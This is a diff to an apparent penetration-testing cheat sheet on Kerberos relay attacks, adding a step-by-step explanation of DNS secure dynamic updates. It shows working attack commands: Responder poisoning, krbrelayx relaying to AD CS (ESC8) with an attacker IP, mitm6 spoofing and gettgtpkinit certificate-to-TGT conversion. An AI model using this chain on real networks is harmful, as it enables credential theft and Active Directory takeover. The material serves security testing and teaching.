@@ -18,7 +18,7 @@ HTTP through multicast poisoning (LLMNR)
 **Example**: ESC8 with Kerberos Relay
 
 ```ps1
-python3 Responder.py -I eth0 -N <PKI_SERVER>
+python3 Responder.py -I eth0 -N <PKI_SERVER_NETBIOS_NAME>
 sudo python3 krbrelayx.py --target 'http://<PKI_SERVER>.<DOMAIN.LOCAL>/certsrv/' -ip <ATTACKER_IP> --adcs --template User -debug
 ```
 
@@ -30,8 +30,19 @@ Abuses the DNS Secure Dynamic Updates in Active Directory.
 * [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
 * [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
 
+**Steps**:
+
+* The client queries for the Start Of Authority (SOA) record for it’s name, which indicates which server is authoritative for the domain the client is in.
+* The server responds with the DNS server that is authorative, in this case the DC icorp-dc.internal.corp.
+* The client attempts a dynamic update on the A record with their name in the zone internal.corp.
+* This dynamic update is refused by the server because no authentication is provided.
+* The client uses a TKEY query to negotiate a secret key for authenticated queries.
+* The server answers with a TKEY Resource Record, which completes the authentication.
+* The client sends the dynamic update again, but now accompanied by a TSIG record, which is a signature using the key established in steps 5 and 6.
+* The server acknowledges the dynamic update. The new DNS record is now in place.
+
 ```ps1
-# Example - Relay to ADCS
+# Example - Relay to ADCS - ESC8
 sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine
 sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
 python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz internal.corp/icorp-w10$ icorp-w10.ccache
